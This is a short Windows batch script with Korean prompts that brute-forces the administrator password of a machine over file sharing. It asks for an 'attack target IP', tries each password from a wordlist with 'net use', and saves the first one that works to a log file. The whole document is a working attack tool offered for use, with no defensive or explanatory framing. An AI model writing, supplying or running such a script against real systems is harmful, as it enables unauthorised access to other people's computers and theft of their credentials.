@echo off
set /p target_ip="공격 대상 IP: "
for /f %%a in (passwords.txt) do (
    echo [시도 중] 암호: %%a
    net use \\%target_ip% /user:administrator %%a >nul 2>&1
    if not errorlevel 1 (
        echo.
        echo [!] 접속 성공! 암호는: %%a
        echo %%a > success_log.txt
        pause
        exit
    )
)
echo 모든 암호 시도 실패.
